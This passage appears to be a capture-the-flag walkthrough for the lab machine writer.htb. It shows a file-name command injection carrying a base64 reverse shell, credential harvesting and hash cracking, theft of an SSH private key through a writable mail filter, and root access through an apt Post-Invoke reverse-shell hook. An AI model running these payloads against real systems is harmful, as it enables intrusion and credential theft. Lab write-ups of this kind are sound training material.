It then ensures that the request has the `image_url` parameter and that it contains the string `.jpg`. It retrieves a file from the `image_url` using the [`urllib.request.urlretrieve()`](https://docs.python.org/3/library/urllib.request.html) function. If the URL is an HTTP URL, the file is saved to a temporary file at `/tmp/tmp$EIGHT_RANDOM_CHARACTERS`, which is not in the attacker's control, and the path of that file is stored in the `local_filename` variable. However, if the URL is for a local file (file://), the path to the local file will be stored in `local_filename`.

The endpoint then executes the line `os.system("mv {} {}.jpg".format(local_filename, local_filename))` to append `.jpg` to the end of the file name. This line is vulnerable to command injection in two steps.

Step One: Upload a file whose name is `tgihf.jpg;$INJECTED_COMMAND_HERE;`. Don't submit anything for the `image_url` parameter. The file will be saved under the `/var/www/writer.htb/writer/static/img/` directory.

Step Two: Submit a request with `image_url` equal to `file:///var/www/writer.htb/writer/static/img/tgihf.jpg;$INJECTED_COMMAND_HERE;`. This will be passed into the operating system call, resulting in the execution of:

```bash
mv /var/www/writer.htb/writer/static/img/tgihf.jpg;$INJECTED_COMMAND_HERE; /var/www/writer.htb/writer/static/img/tgihf.jpg;$INJECTED_COMMAND_HERE;
```

If `$INJECTED_COMMAND_HERE` is a reverse shell command, this should give the attacker access to the target. Inject the command `bash -i >& /dev/tcp/10.10.14.164/443 0>&1`. However, since this command has `/` characters, which are illegal for a file name, base64 encode the command and inject a command that base64 decodes it and pipes it to `bash`:

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjQvNDQzIDA+JjE= | base64 -d | bash
```

Thus, the final file name to upload is `tgihf.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjQvNDQzIDA+JjE= | base64 -d | bash;`.

Start a reverse shell listener.

```bash
$ sudo nc -lvp 443
listening on [any] 443 ...
```

Submit the initial request to create the file on the target.

```http
POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------36791868763297754064620836030
Content-Length: 2181977
Origin: http://writer.htb
DNT: 1
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoiYWRtaW4nIE9SIDE9MTstLSJ9.YVn7rg.1WnoJt8x2VtsWPiAfhmlu5YDCXI
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="author"

tgihf
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="title"

tgihf-title
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="tagline"

tgihf-tagline
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="image"; filename="tgihf.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjQvNDQzIDA+JjEK | base64 -d | bash;"
Content-Type: image/jpeg

...[SNIP]...
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="image_url"


-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="content"

blah
-----------------------------36791868763297754064620836030--
```

Submit the request to inject the name of the file into an operating system command and receive a reverse shell.

```http
POST /dashboard/stories/add HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------36791868763297754064620836030
Content-Length: 2182171
Origin: http://writer.htb
DNT: 1
Connection: close
Referer: http://writer.htb/dashboard/stories/add
Cookie: session=eyJ1c2VyIjoiYWRtaW4nIE9SIDE9MTstLSJ9.YVn7rg.1WnoJt8x2VtsWPiAfhmlu5YDCXI
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="author"

tgihf
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="title"

tgihf-title
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="tagline"

tgihf-tagline
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="image"; filename="simon-berger-twukN12EN7c-unsplash.jpg"
Content-Type: image/jpeg

...[SNIP]...
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="image_url"


file:///var/www/writer.htb/writer/static/img/tgihf.jpg;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNjQvNDQzIDA+JjEK | base64 -d | bash;
-----------------------------36791868763297754064620836030
Content-Disposition: form-data; name="content"

blah
-----------------------------36791868763297754064620836030--
```

Receive access to the target as `www-data`.

```bash
$ sudo nc -lvp 443
listening on [any] 443 ...
connect to [10.10.14.164] from writer.htb [10.10.11.101] 48086
bash: cannot set terminal process group (1060): Inappropriate ioctl for device
bash: no job control in this shell
www-data@writer:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Foothold to User

Exploring the `/var/www/` directory reveals the source code for a [Django](https://www.djangoproject.com/) application at `/var/www/writerv2_project/`. Its configuration settings, `/var/www/writerv2_project/writerv2/settings.py`, indicate that its database settings are pulled from `/etc/mysql/my.cnf`.

```python
...[SNIP]...
# Database
# https://docs.djangoproject.com/en/1.10/ref/settings/#databases

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'OPTIONS': {
            'read_default_file': '/etc/mysql/my.cnf',
        },
    }
}
...[SNIP]...
```

This file is world-readable. Its contents:

```txt
# The MariaDB configuration file
#
# The MariaDB/MySQL tools read configuration files in the following order:
# 1. "/etc/mysql/mariadb.cnf" (this file) to set global defaults,
# 2. "/etc/mysql/conf.d/*.cnf" to set global options.
# 3. "/etc/mysql/mariadb.conf.d/*.cnf" to set MariaDB-only options.
# 4. "~/.my.cnf" to set user-specific options.
#
# If the same option is defined multiple times, the last one will apply.
#
# One can use all long options that the program supports.
# Run program with --help to get a list of available options and with
# --print-defaults to see which it would actually understand and use.

#
# This group is read both both by the client and the server
# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

The Django application interacts with the MySQL `dev` database using the credentials `djangouser:DjangoSuperPassword`.

Connecting to the database reveals the table `auth_user` that contains the Django password hash for the `kyle` account, which is one of the user accounts on the machine gathered during SMB enumeration.

```txt
www-data@writer:/var/www/writer2_project/writerv2$ mysql -u djangouser -p
mysql -u djangouser -p
Enter password: DjangoSuperPassword

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 131
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [dev]> use dev
use dev
Database changed
MariaDB [dev]> show tables;
show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.001 sec)

MariaDB [dev]> select * from auth_user;
select * from auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.000 sec)
```

Crack this password hash.

```bash
$ hashcat -a 0 -m 10000 'pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=' rockyou.txt
pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
```

`kyle`'s password is `marcoantonio`. Use this credential to login via SSH and grab the user flag.

```bash
$ ssh kyle@writer.htb
kyle@writer.htb's password:
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun  3 Oct 20:24:06 UTC 2021

  System load:  0.08              Processes:             248
  Usage of /:   64.1% of 6.82GB   Users logged in:       0
  Memory usage: 30%               IPv4 address for eth0: 10.10.11.101
  Swap usage:   0%

 * Pure upstream Kubernetes 1.21, smallest, simplest cluster ops!

     https://microk8s.io/

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Sun Oct  3 20:23:54 2021 from 10.10.14.164
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
```

---

## `kyle` to `john`

Check the groups that `kyle` is a member of.

```bash
$ groups
kyle filter smbgroup
```

`kyle` is a member of the `filter` group. Does this have something to do with `postfix` email filtering? Read the filtering rules in the `postfix` configuration file, `/etc/postfix/master.cf`.

```txt
flags=DRhu user=vmail argv=/usr/bin/maildrop -d ${recipient}
#  user=cyrus argv=/cyrus/bin/deliver -e -r ${sender} -m ${extension} ${user}
#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}
  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)
  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)
  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient
  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}
  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py
  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

Note the final rule. Whenever the user `john@writer.htb` recieves an email, he will execute `/etc/postfix/disclaimer`. This file is writable by the `filter` group.

```bash
$ ls -la /etc/postfix/disclaimer
-rwxrwxr-x 1 root filter 1021 Oct  4 14:08 /etc/postfix/disclaimer
```

The target is serving SMTP on localhost port 25.

```bash
$ netstat -ano | grep LISTEN | grep tcp
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::445                  :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::139                  :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
```

Use [`chisel`](https://github.com/jpillora/chisel) to initiate a reverse port forward tunnel from the attacker's localhost 25 to the target's localhost 25. Download the Linux AMD 64-bit release and transfer it to the target.

Attacker:

```bash
$ ls
chisel
$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Target:

```bash
$ wget http://10.10.14.164/chisel
-2021-10-04 14:16:22--  http://10.10.14.164/chisel
Connecting to 10.10.14.164:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8339456 (8.0M) [application/octet-stream]
Saving to: ‘chisel’

chisel                                               100%[=====================================================================================================================>]   7.95M  23.6MB/s    in 0.3s

2021-10-04 14:16:22 (23.6 MB/s) - ‘chisel’ saved [8339456/8339456]
```

On the attacker, initiate the `chisel` server.

```bash
$ ./chisel server --port 8001 --reverse
2021/10/04 13:36:16 server: Reverse tunnelling enabled
2021/10/04 13:36:16 server: Fingerprint TctN1vWV6/IEJ60yQ7qgTRo/+r24PCBKXEYZNstpnqA=
2021/10/04 13:36:16 server: Listening on http://0.0.0.0:8001
2021/10/04 13:37:17 server: session#1: tun: proxy#R:25=>localhost:25: Listening
```

On the target, connect to the `chisel` server to initiate the reverse port forward.

```bash
$ ./chisel client 10.10.14.164:8001 R:25:localhost:25
2021/10/04 13:37:15 client: Connecting to ws://10.10.14.164:8001
2021/10/04 13:37:15 client: Connected (Latency 18.557415ms)
```

On the target, add the following two lines to `/etc/postfix/disclaimer`.

```bash
$ cat /home/john/.ssh/id_rsa > /dev/shm/tgihf/john-id-rsa
$ chmod 777 /dev/shm/tgihf/john-id-rsa
```

On the attacker, send an email through the reverse port forward connection to `john@writer.htb` to trigger the execution of `/etc/postfix/disclaimer` and write `john`'s SSH private key to `/etc/postfix/disclaimer`.

```bash
swaks --to john@writer.htb --from tgihf@writer.htb --header "Subject: tgihf" --body "Please receive this kind message" --server 127.0.0.1
```

On the target, read `john`'s SSH private key.

```bash
$ cat /dev/shm/tgihf/john-id-rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Use `john`'s SSH private key to log in to his account.

```bash
$ ssh -i john_id_rsa john@writer.htb                                                                   Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon  4 Oct 14:23:22 UTC 2021

  System load:  0.05              Processes:             259
  Usage of /:   64.5% of 6.82GB   Users logged in:       1
  Memory usage: 23%               IPv4 address for eth0: 10.10.11.101
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Wed Jul 28 09:19:58 2021 from 10.10.14.19
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

---

## `john` to `root`

Check `john`'s groups.

```bash
$ groups
john management
```

Note the `management` group. According to [`linpeas.sh`](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), the only significant thing about this group is that it can write to `/etc/apt/apt.conf.d/`.

```bash
$ ls -la /etc/apt/apt.conf.d/
total 48
drwxrwxr-x 2 root management 4096 Jul 28 09:24 .
drwxr-xr-x 7 root root       4096 Jul  9 10:59 ..
-rw-r--r-- 1 root root        630 Apr  9  2020 01autoremove
-rw-r--r-- 1 root root         92 Apr  9  2020 01-vendor-ubuntu
-rw-r--r-- 1 root root        129 Dec  4  2020 10periodic
-rw-r--r-- 1 root root        108 Dec  4  2020 15update-stamp
-rw-r--r-- 1 root root         85 Dec  4  2020 20archive
-rw-r--r-- 1 root root       1040 Sep 23  2020 20packagekit
-rw-r--r-- 1 root root        114 Nov 19  2020 20snapd.conf
-rw-r--r-- 1 root root        625 Oct  7  2019 50command-not-found
-rw-r--r-- 1 root root        182 Aug  3  2019 70debconf
-rw-r--r-- 1 root root        305 Dec  4  2020 99update-notifier
```

Also according to `linpeas.sh`, `root` is running the following cronjob:

```txt
root       22679  0.0  0.0   8352  3372 ?        S    14:28   0:00  _ /usr/sbin/CRON -f
root       22688  0.0  0.0   2608   612 ?        Ss   14:28   0:00      _ /bin/sh -c /usr/bin/apt-get update
root       22691  0.1  0.2  16204  8712 ?        S    14:28   0:00          _ /usr/bin/apt-get update
```

`apt-get update` updates the system's package repositories based on the files in the `/etc/apt/apt.conf.d/` directory. By writing a malicious payload to this directory, it is possible to escalate privileges to the `root` account.

On the attacker, start a listener.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
```

On the target, create the payload.

```bash
$ echo 'apt::Update::Post-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.164 443 >/tmp/f"};' > /etc/apt/apt.conf.d/tgihf
```

Wait for the cronjob to execute and receive the shell.

```bash
$ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.164] from (UNKNOWN) [10.10.11.101] 43862
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Read the system flag to complete the challenge.
